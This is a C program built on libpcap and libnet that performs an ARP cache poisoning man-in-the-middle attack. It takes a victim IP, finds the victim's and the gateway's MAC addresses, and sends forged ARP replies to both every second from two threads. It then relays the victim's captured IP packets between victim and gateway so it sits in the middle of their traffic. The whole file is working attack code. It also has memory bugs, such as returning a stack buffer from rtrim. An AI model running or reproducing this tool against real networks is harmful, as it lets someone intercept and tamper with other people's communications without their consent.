#include <pcap.h>
#include <libnet.h>
#include <stdio.h>
#include <pthread.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>

#define ARP_REQUEST 1   /* ARP Request             */
#define ARP_REPLY 2     /* ARP Reply               */
typedef struct arphdr {
    u_int16_t htype;    /* Hardware Type           */
    u_int16_t ptype;    /* Protocol Type           */
    u_char hlen;        /* Hardware Address Length */
    u_char plen;        /* Protocol Address Length */
    u_int16_t oper;     /* Operation Code          */
    u_char sha[6];      /* Sender hardware address */
    u_char spa[4];      /* Sender IP address       */
    //struct in_addr spa;
    u_char tha[6];      /* Target hardware address */
    u_char tpa[4];      /* Target IP address       */
    //struct in_addr tpa;
}arphdr_t;

#define MAXBYTES2CAPTURE 2048

//debug define
#define DEBUG_LEVEL_	3

#ifdef  DEBUG_LEVEL_
#define dp(n, fmt, args...)	if (DEBUG_LEVEL_ <= n) fprintf(stderr, "%s:%d,"fmt, __FILE__, __LINE__, ## args)
#define dp0(n, fmt)		if (DEBUG_LEVEL_ <= n) fprintf(stderr, "%s:%d,"fmt, __FILE__, __LINE__)
#define _dp(n, fmt, args...)	if (DEBUG_LEVEL_ <= n) fprintf(stderr, " "fmt, ## args)
#else	/* DEBUG_LEVEL_ */
#define dp(n, fmt, args...)
#define dp0(n, fmt)
#define _dp(n, fmt, args...)
#endif	/* DEBUG_LEVEL_ */

#define MAX_STR_LEN 4000

struct thread_arg{
    char *vip;
    char *gatewayip;
    u_char mac[20];
    u_char gmac[20];
    u_char vmac[20];
    pcap_t *descr;
    u_char packet[100];
};

int getIPAddress(char *ip_addr)
{
    int sock;
    struct ifreq ifr;
    struct sockaddr_in *sin;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        dp(4, "socket");
        return 0;
    }


    strcpy(ifr.ifr_name, "ens33");
    if (ioctl(sock, SIOCGIFADDR, &ifr)< 0)
    {
        dp(4, "ioctl() - get ip");
        close(sock);
        return 0;
    }

    sin = (struct sockaddr_in*)&ifr.ifr_addr;
    strcpy(ip_addr, inet_ntoa(sin->sin_addr));

    close(sock);
    return 1;
}

int getMyMacAddress(unsigned char *mac)
{
    int sock;
    struct ifreq ifr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        dp(4, "socket");
        return 0;
    }

    strcpy(ifr.ifr_name, "ens33");
    if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0)
    {
        dp(4, "ioctl() - get mac");
        close(sock);
        return 0;
    }

    for(int i=0; i<6; i++)
        mac[i] = ifr.ifr_hwaddr.sa_data[i];

    close(sock);
    return 1;
}

// 문자열 우측 공백문자 삭제 함수
char* rtrim(char* s) {
    char t[MAX_STR_LEN];
    char *end;
    strcpy(t, s); // 이것은 Visual C 2005용
    end = t + strlen(t) - 1;
    while (end != t && isspace(*end))
        end--;
    *(end + 1) = '\0';
    s = t;

    return s;
}

// 문자열 좌측 공백문자 삭제 함수
char* ltrim(char *s) {
    char* begin;
    begin = s;

    while (*begin != '\0') {
        if (isspace(*begin))
            begin++;
        else {
            s = begin;
            break;
        }
    }

    return s;
}

// 문자열 앞뒤 공백 모두 삭제 함수
char* trim(char *s) {
    return rtrim(ltrim(s));
}

char* getGatewayIP(){
    FILE *in=popen("netstat -r", "r");
    char tmp[256]={0x0};
    char *ptr=0;
    static char gateway[100];
    int i=0;

    while(fgets(tmp,sizeof(tmp),in)!=NULL)
    {
        if((ptr=strstr(tmp, "default"))!=NULL){
            ptr+=+strlen("default");
            ptr=trim(ptr);
            break;
        }
    }

    while(*ptr != ' ')
        gateway[i++]=*ptr++;
    gateway[i] = '\0';

    pclose(in);

    return gateway;
}

void *sendPoisonGateway(void *data){
    unsigned char packet[100];
    struct libnet_ethernet_hdr test;
    arphdr_t test2;
    struct thread_arg *arg=(struct thread_arg *)data;

    memset(packet, 0, sizeof(packet));

    for(int i=0; i<6; i++){
        test.ether_dhost[i]=arg->gmac[i];
    }

    for(int i=0;i<6;i++){
        test.ether_shost[i]=arg->mac[i];
    }

    test.ether_type=htons(ETHERTYPE_ARP);

    test2.htype=htons(1);
    test2.ptype=htons(ETHERTYPE_IP);
    test2.hlen=0x06;
    test2.plen=0x04;
    test2.oper=htons(ARP_REPLY);
    for(int i=0;i<6;i++){
        test2.sha[i]=arg->mac[i];
    }
    inet_pton(AF_INET, arg->vip, test2.spa);
    for(int i=0;i<6;i++){
        test2.tha[i]=arg->gmac[i];
    }
    inet_pton(AF_INET, arg->gatewayip, test2.tpa);

    memcpy(packet, (void *)&test, sizeof(struct libnet_ethernet_hdr));
    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&test2, sizeof(arphdr_t));

    while(1){
        if(pcap_sendpacket(arg->descr, packet, 60) != 0){
            fprintf(stderr,"\n Error sending the packet: %s\n", pcap_geterr(arg->descr));
            exit(-1);
        }
        sleep(1);
    }

    pthread_exit(0);
}

void *sendPoisonVictim(void *data){
    unsigned char packet[100];
    struct libnet_ethernet_hdr test;
    arphdr_t test2;
    struct thread_arg *arg=(struct thread_arg *)data;

    memset(packet, 0, sizeof(packet));

    for(int i=0; i<6; i++){
        test.ether_dhost[i]=arg->vmac[i];
    }

    for(int i=0;i<6;i++){
        test.ether_shost[i]=arg->mac[i];
    }

    test.ether_type=htons(ETHERTYPE_ARP);

    test2.htype=htons(1);
    test2.ptype=htons(ETHERTYPE_IP);
    test2.hlen=0x06;
    test2.plen=0x04;
    test2.oper=htons(ARP_REPLY);
    for(int i=0;i<6;i++){
        test2.sha[i]=arg->mac[i];
    }
    inet_pton(AF_INET, arg->gatewayip, test2.spa);
    for(int i=0;i<6;i++){
        test2.tha[i]=arg->vmac[i];
    }
    inet_pton(AF_INET, arg->vip, test2.tpa);

    memcpy(packet, (void *)&test, sizeof(struct libnet_ethernet_hdr));
    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&test2, sizeof(arphdr_t));

    while(1){
        if(pcap_sendpacket(arg->descr, packet, 60) != 0){
            fprintf(stderr,"\n Error sending the packet: %s\n", pcap_geterr(arg->descr));
            exit(-1);
        }
        sleep(1);
    }

    pthread_exit(0);
}

int main(int argc, char *argv[])
{
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* descr;
    bpf_u_int32 pMask;
    bpf_u_int32 pNet;

    u_char packet[100];
    char *gatewayip;
    char ip[20];
    u_char mac[20];

    struct libnet_ethernet_hdr test;
    arphdr_t test2;

    struct pcap_pkthdr* pkthdr;
    u_char* data;
    int res;

    u_char vmac[6];
    u_char gmac[6];

    pthread_t thread;
    int thr_id;

    if(argc != 2){
        printf("Please input victim IP\n");
        return -1;
    }

    dev = pcap_lookupdev(errbuf);
    printf("\n ---You opted for device [%s] to capture packets---\n\n Starting capture...\n", dev);

    if(dev == NULL){
        printf("\n[%s]\n", errbuf);
        return -1;
    }

    pcap_lookupnet(dev, &pNet, &pMask, errbuf);

    descr = pcap_open_live(dev, BUFSIZ, 0, -1, errbuf);

    if(descr == NULL){
        printf("pcap_open_live() failed due to [%s]\n", errbuf);
        return -1;
    }

    getIPAddress(ip);
    getMyMacAddress(mac);
    gatewayip=getGatewayIP();

    for(int i=0; i<6; i++){
        test.ether_dhost[i]=0xFF;
    }

    for(int i=0;i<6;i++){
        test.ether_shost[i]=mac[i];
    }

    test.ether_type=htons(ETHERTYPE_ARP);

    test2.htype=htons(1);
    test2.ptype=htons(ETHERTYPE_IP);
    test2.hlen=0x06;
    test2.plen=0x04;
    test2.oper=htons(ARP_REQUEST);
    for(int i=0;i<6;i++){
        test2.sha[i]=mac[i];
    }
    inet_pton(AF_INET, ip, test2.spa);
    for(int i=0;i<6;i++){
        test2.tha[i]=0x00;
    }
    inet_pton(AF_INET, argv[1], test2.tpa);

    memcpy(packet, (void *)&test, sizeof(struct libnet_ethernet_hdr));
    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&test2, sizeof(arphdr_t));

    if(pcap_sendpacket(descr, packet, 42) != 0){
        fprintf(stderr,"\n Error sending the packet: %s\n", pcap_geterr(descr));
        return -1;
    }

    while((res=pcap_next_ex(descr, &pkthdr, (const u_char**)&data))>=0){
        if(res==0)
            continue;

        struct libnet_ethernet_hdr *etherhdr;
        arphdr_t *arphdr;
        char buf[20];

        etherhdr = (struct libnet_ethernet_hdr*)(data);
        data += sizeof(struct libnet_ethernet_hdr);

        arphdr = (arphdr_t*)(data);

        if (ntohs(etherhdr->ether_type) == ETHERTYPE_ARP){
            inet_ntop(AF_INET, arphdr->spa, buf, sizeof(buf));
            if(!strcmp(buf, argv[1])){
                for(int i=0;i<6;i++)
                    vmac[i]=arphdr->sha[i];
                break;
            }
        }
    }

    printf("Victim MAC Address: ");
    for (int i = 0; i < 6; i++){
        printf("%02X", vmac[i]);
        if(i == 5)
            printf("\n");
        else
            printf(":");
    }

    //////////////////////////////////////////////////////

    for(int i=0; i<6; i++){
        test.ether_dhost[i]=0xFF;
    }

    for(int i=0;i<6;i++){
        test.ether_shost[i]=mac[i];
    }

    test.ether_type=htons(ETHERTYPE_ARP);

    test2.htype=htons(1);
    test2.ptype=htons(ETHERTYPE_IP);
    test2.hlen=0x06;
    test2.plen=0x04;
    test2.oper=htons(ARP_REQUEST);
    for(int i=0;i<6;i++){
        test2.sha[i]=mac[i];
    }
    inet_pton(AF_INET, ip, test2.spa);
    for(int i=0;i<6;i++){
        test2.tha[i]=0x00;
    }
    inet_pton(AF_INET, gatewayip, test2.tpa);

    memcpy(packet, (void *)&test, sizeof(struct libnet_ethernet_hdr));
    memcpy(packet+sizeof(struct libnet_ethernet_hdr), (void *)&test2, sizeof(arphdr_t));

    if(pcap_sendpacket(descr, packet, 42) != 0){
        fprintf(stderr,"\n Error sending the packet: %s\n", pcap_geterr(descr));
        return -1;
    }

    while((res=pcap_next_ex(descr, &pkthdr, (const u_char**)&data))>=0){
        if(res==0)
            continue;

        struct libnet_ethernet_hdr *etherhdr;
        arphdr_t *arphdr;
        char buf[20];

        etherhdr = (struct libnet_ethernet_hdr*)(data);
        data += sizeof(struct libnet_ethernet_hdr);

        arphdr = (arphdr_t*)(data);

        if (ntohs(etherhdr->ether_type) == ETHERTYPE_ARP){
            inet_ntop(AF_INET, arphdr->spa, buf, sizeof(buf));
            if(!strcmp(buf, gatewayip)){
                for(int i=0;i<6;i++)
                    gmac[i]=arphdr->sha[i];
                break;
            }
        }
    }

    printf("Gateway MAC Address: ");
    for (int i = 0; i < 6; i++){
        printf("%02X", gmac[i]);
        if(i == 5)
            printf("\n");
        else
            printf(":");
    }

    /////////////////////////////////////////////////////////////////////////

    struct thread_arg arg;
    memset(&arg, 0, sizeof(arg));

    arg.descr=descr;
    arg.gatewayip=gatewayip;
    arg.vip=argv[1];
    for(int i=0;i<6;i++){
        arg.mac[i]=mac[i];
        arg.gmac[i]=gmac[i];
        arg.vmac[i]=vmac[i];
    }

    thr_id = pthread_create(&thread, NULL, sendPoisonGateway, (void *)&arg);
    if(thr_id < 0){
        perror("thread create error\n");
        exit(0);
    }

    thr_id = pthread_create(&thread, NULL, sendPoisonVictim, (void *)&arg);
    if(thr_id < 0){
        perror("thread create error\n");
        exit(0);
    }

    struct libnet_ethernet_hdr *etherhdr_test;
    struct libnet_ipv4_hdr *iphdr_test;
    char buf[20];

    while(1){
        while((res=pcap_next_ex(descr, &pkthdr, (const u_char**)&data))>=0){
            if(res==0)
                continue;

            memcpy(packet, data, sizeof(packet));

            etherhdr_test = (struct libnet_ethernet_hdr*)(data);
            data += sizeof(struct libnet_ethernet_hdr);

            iphdr_test = (struct libnet_ipv4_hdr*)(data);

            if (ntohs(etherhdr_test->ether_type) == ETHERTYPE_IP){
                inet_ntop(AF_INET, &iphdr_test->ip_src, buf, sizeof(buf));
                if(!strcmp(buf, argv[1])){
                    printf("request\n");

                    for(int i=0;i<6;i++){
                        etherhdr_test->ether_dhost[i]=gmac[i];
                        etherhdr_test->ether_shost[i]=mac[i];
                    }

                    memcpy(packet, etherhdr_test, sizeof(struct libnet_ethernet_hdr));

                    if(pcap_sendpacket(descr, packet, sizeof(struct libnet_ethernet_hdr) + ntohs(iphdr_test->ip_len)) != 0){
                        fprintf(stderr,"\n Error sending the packet: %s\n", pcap_geterr(descr));
                        exit(-1);
                    }
                    break;
                }
            }
        }

        while((res=pcap_next_ex(descr, &pkthdr, (const u_char**)&data))>=0){
            if(res==0)
                continue;

            memcpy(packet, data, sizeof(packet));

            etherhdr_test = (struct libnet_ethernet_hdr*)(data);
            data += sizeof(struct libnet_ethernet_hdr);

            iphdr_test = (struct libnet_ipv4_hdr*)(data);

            if (ntohs(etherhdr_test->ether_type) == ETHERTYPE_IP){
                inet_ntop(AF_INET, &iphdr_test->ip_dst, buf, sizeof(buf));
                if(!strcmp(buf, argv[1])){
                    printf("reply\n");

                    for(int i=0;i<6;i++){
                        etherhdr_test->ether_dhost[i]=vmac[i];
                        etherhdr_test->ether_shost[i]=mac[i];
                    }

                    memcpy(packet, etherhdr_test, sizeof(struct libnet_ethernet_hdr));

                    if(pcap_sendpacket(descr, packet, sizeof(struct libnet_ethernet_hdr) + ntohs(iphdr_test->ip_len)) != 0){
                        fprintf(stderr,"\n Error sending the packet: %s\n", pcap_geterr(descr));
                        exit(-1);
                    }
                    break;

                }
            }
        }
    }
    return 0;
}
